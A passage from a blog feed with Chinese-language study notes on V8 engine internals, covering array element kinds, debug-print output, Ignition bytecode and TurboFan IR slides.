0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e950f779 [FastProperties]</span><br><span class="line"> - prototype = 0xf279b90c9e9</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e950f779: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x31013b402311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0xf279b90cad9 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0xf279b90c9e9 &lt;Object map = 0x236e950f7d1&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">B</span><br><span class="line">c</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-082449.jpg" alt=""><br>  简言之，如果属性在接收者上找不到（接受者可以理解为要访问的属性或者方法指向的那个对象），那么就会继续到原型链上找。<br>这些元素是自给自足的，换言之，我们不需要在隐藏类上储存这些索引属性。另外，我们需要一个特殊的值，称之为空洞，来标记那些不存在属性。这点对于数组方法的性能很关键。<br>若是我们知道elements store没有空洞，是被填满的，我们可以提高本地操作（指无需原型链参与）的性能，不需要再去花费昂贵的代价查找原型链。</p><h3 id="Fast-or-Dictionary-Elements"><a href="#Fast-or-Dictionary-Elements" class="headerlink" title="Fast or Dictionary Elements"></a>Fast or Dictionary Elements</h3><p>  第二个关于元素的主要的区分为是否是快速或是字典模式。快速元素就是VM内部简单的将数组索引与elements store中的索引映射。<br>然而，这种简单表示，在那种有很大的空洞以及很少位置被占用的数组上是相当浪费的。在这种情况下，我们将转换成字典模式，这会减小内存但轻微的牺牲性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sparseArray = [];</span><br><span class="line">sparseArray[<span class="number">9999</span>] = <span class="string">"foo"</span>; <span class="comment">// Creates an array with dictionary elements.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">DebugPrint: 0x6ed6db8c769: [JSArray]</span><br><span class="line"> - map = 0x16a58d0f779 [FastProperties]</span><br><span class="line"> - prototype = 0x37db83507f51</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 10000</span><br><span class="line"> - properties = 0x38a1eb682241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3529df1b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   9999: 0x37db8352faa9 &lt;String[3]: foo&gt; (data, dict_index: 0, attrs: [WEC])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145330.png" alt=""><br>0x270F=9999</p><p>  在这个例子中，如果给这个数组分配完整的10k个空间将会造成极大浪费。而实际上V8是创建了一个key-value-descriptor的triplets。这个例子中的key是“9999”，value是“foo”，而descriptor是使用的默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(array, <span class="number">0</span>, &#123;<span class="attr">value</span>: <span class="string">"fixed"</span>, <span class="attr">configurable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">%DebugPrint(array)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff43f1700 (LWP 18068)]</span><br><span class="line">DebugPrint: 0x28f5f190c759: [JSArray]</span><br><span class="line"> - map = 0x1e39b868f881 [FastProperties]</span><br><span class="line"> - prototype = 0x61172b07f51</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 1</span><br><span class="line"> - properties = 0x3c90a5102241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a07bddb6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   0: 0x3c90a5111569 &lt;String[5]: fixed&gt; (data, dict_index: 0, attrs: [___])</span><br><span class="line"> &#125;</span><br><span class="line">0x1e39b868f881: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e39b8683e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x61172b08a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x61172b07f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x61172b07f71 &lt;JSFunction Array (sfi = 0x3c90a513d6c1)&gt;</span><br><span class="line"> - code cache: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-084456.png" alt=""><br>  在上面例子中，我们给数组添加了一个non-configurable属性。这个信息就会被保存慢元素字典的triplet中的descriptor 部分。需要切记一点，数组方法在那些拥有慢元素的对象上的性能会相当慢。</p><h3 id="The-ElementsAccessor"><a href="#The-ElementsAccessor" class="headerlink" title="The ElementsAccessor"></a>The ElementsAccessor</h3><p>你可以想到开发人员根本不愿意为这20种元素在C++中对应重复写20遍数组方法。这里就是体现C++神奇的地方了。为了不实现数组方法一遍又一遍，我们建立了一个属性存取器（ElementsAccessor），在它里面大部分都仅仅是简单的属性访问相关的方法。这个属性访问其依赖C++中的CRTP来实现不同种类需求的数组方法。所以，有时如果我们调用例如数组的slice，V8会调用C++中的代码，然后通过属性存取器来选择所需函数，如slice的专门版本。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-090501.jpg" alt=""></p><h2 id="学习v8字节码"><a href="#学习v8字节码" class="headerlink" title="学习v8字节码"></a>学习v8字节码</h2><h3 id="阅读和打印（只是个例子）"><a href="#阅读和打印（只是个例子）" class="headerlink" title="阅读和打印（只是个例子）"></a>阅读和打印（只是个例子）</h3><p><code>./d8 --print-bytecode test.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function incrementX(obj) &#123;</span><br><span class="line">  return 1 + obj.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">incrementX(&#123;x: 42&#125;);</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$ node --print-bytecode incrementX.js</span><br><span class="line">...</span><br><span class="line">[generating bytecode for function: incrementX]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 8</span><br><span class="line">  12 E&gt; 0x2ddf8802cf6e @    StackCheck</span><br><span class="line">  19 S&gt; 0x2ddf8802cf6f @    LdaSmi [1]</span><br><span class="line">        0x2ddf8802cf71 @    Star r0</span><br><span class="line">  34 E&gt; 0x2ddf8802cf73 @    LdaNamedProperty a0, [0], [4]</span><br><span class="line">  28 E&gt; 0x2ddf8802cf77 @    Add r0, [6]</span><br><span class="line">  36 S&gt; 0x2ddf8802cf7a @    Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x2ddf8802cf21: [FixedArray] in OldSpace</span><br><span class="line"> - map = 0x2ddfb2d02309 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br><span class="line">Handler Table (size = 16)</span><br></pre></td></tr></table></figure></p><ul><li>LdaSmi [1]<br>LdaSmi [1]将常量 1 加载到累加器中。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-144516.jpg" alt=""></li><li>Star r0<br>接下来，Star r0 将当前在累加器中的值 1 存储在寄存器 r0 中。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145501.jpg" alt=""></li><li>LdaNamedProperty a0, [0], [4]<br>LdaNamedProperty 将 a0 的命名属性加载到累加器中。ai 指向 incrementX() 的第 i 个参数。在这个例子中，我们在 a0 上查找一个命名属性，这是 incrementX() 的第一个参数。该属性名由常量 0 确定。LdaNamedProperty 使用 0 在单独的表中查找名称：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br></pre></td></tr></table></figure></li></ul><p>可以看到，0 映射到了 x。因此这行字节码的意思是加载 obj.x。<br>那么值为 4 的操作数是干什么的呢？ 它是函数 incrementX() 的反馈向量的索引。反馈向量包含用于性能优化的 runtime 信息。<br>现在寄存器看起来是这样的：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145844.jpg" alt=""></p><ul><li><p>Add r0, [6]<br>最后一条指令将 r0 加到累加器，结果是 43。 6 是反馈向量的另一个索引。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145912.jpg" alt=""></p></li><li><p>Return<br>Return 返回累加器中的值。返回语句是函数 incrementX() 的结束。此时 incrementX() 的调用者可以在累加器中获得值 43，并可以进一步处理此值。</p></li></ul><p>乍一看，V8 的字节码看起来非常奇怪，特别是当我们打印出所有的额外信息。但是一旦你知道 Ignition 是一个带有累加器寄存器的寄存器，你就可以分析出大多数字节码都干了什么。</p><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-152050.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-hidden-class-test&quot;&gt;&lt;a href=&quot;#v8-hidden-class-test&quot; class=&quot;headerlink&quot; title=&quot;v8 hidden class test&quot;&gt;&lt;/a&gt;v8 hidden class test&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 slide collection</title>
    <link href="http://eternalsakura13.com/2018/06/18/v8_ppt/"/>
    <id>http://eternalsakura13.com/2018/06/18/v8_ppt/</id>
    <published>2018-06-17T18:54:45.782Z</published>
    <updated>2018-06-18T16:03:13.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="The-TurboFan-architecture-entry-points"><a href="#The-TurboFan-architecture-entry-points" class="headerlink" title="The TurboFan architecture / entry points"></a>The TurboFan architecture / entry points</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135445.png" alt=""></p><h2 id="TurboFan-pipeline-high-level"><a href="#TurboFan-pipeline-high-level" class="headerlink" title="TurboFan pipeline (high-level)"></a>TurboFan pipeline (high-level)</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135820.png" alt=""></p><h2 id="Code-generation-example"><a href="#Code-generation-example" class="headerlink" title="Code generation example"></a>Code generation example</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135911.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-141841.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-142111.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-142522.png" alt=""></p><h2 id="Turbofan-IR"><a href="#Turbofan-IR" class="headerlink" title="Turbofan IR"></a>Turbofan IR</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><ul><li>Graph based IR<ul><li>Nodes for operations.</li><li>Edges for value flow, control flow and dependencies.</li><li>No distinction between basic blocks and statements.</li><li>Single-static assignment.</li></ul></li><li>High/middle/low-level IR layering.</li><li>Side effects modelled as edges.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143530.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143638.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143823.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143847.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143923.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-144159.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-144341.png" alt=""></li></ul><h3 id="节点分层"><a href="#节点分层" class="headerlink" title="节点分层"></a>节点分层</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145153.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145249.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145907.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150532.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150444.png" alt=""></p><h3 id="IR分层和phases"><a href="#IR分层和phases" class="headerlink" title="IR分层和phases"></a>IR分层和phases</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150639.png" alt=""></p><h4 id="lowering-amp-amp-Typed-Lowering"><a href="#lowering-amp-amp-Typed-Lowering" class="headerlink" title="lowering&amp;&amp;Typed Lowering"></a>lowering&amp;&amp;Typed Lowering</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150811.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150917.png" alt=""></p><h4 id="Representation-selection"><a href="#Representation-selection" class="headerlink" title="Representation selection"></a>Representation selection</h4><p>Representation selection now chooses machine representation and inserts conversions.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151052.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151159.png" alt=""></p><h4 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151948.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152002.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152013.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152023.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152032.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152108.png" alt=""></p><h2 id="High-performance-JavaScript-with-V8"><a href="#High-performance-JavaScript-with-V8" class="headerlink" title="High performance JavaScript with V8"></a>High performance JavaScript with V8</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-185932.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190018.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190158.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject(x) &#123;</span><br><span class="line">  this.X = x;</span><br><span class="line">&#125;</span><br><span class="line">function getX(obj) &#123;</span><br><span class="line">  return obj.X;</span><br><span class="line">&#125;</span><br><span class="line">var o = new MyObject(3);</span><br><span class="line">print(getX(o));</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 test.js </span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190248.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191002.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191809.png" alt=""></p><p>用作参考：<a href="https://www.cnblogs.com/yumianhu/p/3707427.html" target="_blank" rel="noopener">https://www.cnblogs.com/yumianhu/p/3707427.html</a><br>关于IC的Cahce State,不过内容略过时。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192512.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192553.png" alt=""><br>Crankshaft已经废弃，这里只是看下type feedback和check<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193124.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193112.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193028.png" alt=""></p><h2 id="理解v8-bytecode"><a href="#理解v8-bytecode" class="headerlink" title="理解v8 bytecode"></a>理解v8 bytecode</h2><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a><br>有中文翻译，读起来很快（逃<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-200254.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-203313.png" alt=""><br><a href="https://2017.jsconf.eu/speakers/" target="_blank" rel="noopener">https://2017.jsconf.eu/speakers/</a><br><a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank" rel="noopener">https://www.chromium.org/developers/how-tos/run-chromium-with-flags</a></p><h2 id="Parsing-JavaScript-better-lazy-than-eager"><a href="#Parsing-JavaScript-better-lazy-than-eager" class="headerlink" title="Parsing JavaScript-better lazy than eager?"></a>Parsing JavaScript-better lazy than eager?</h2><p><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></p><h2 id="Ignition-an-interpreter-for-v8"><a href="#Ignition-an-interpreter-for-v8" class="headerlink" title="Ignition - an interpreter for v8"></a>Ignition - an interpreter for v8</h2><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-152050.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;The-TurboFan-architecture-entry-points&quot;&gt;&lt;a href=&quot;#The-TurboFan-architecture-entry-points&quot; class=&quot;headerlink&quot; title=&quot;The TurboFan arc
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Source to Binary Jounrney of V8 javascript engine</title>
    <link href="http://eternalsakura13.com/2018/06/16/nodefest_v8/"/>
    <id>http://eternalsakura13.com/2018/06/16/nodefest_v8/</id>
    <published>2018-06-16T13:15:20.453Z</published>
    <updated>2018-06-18T18:31:30.410Z</updated>
    
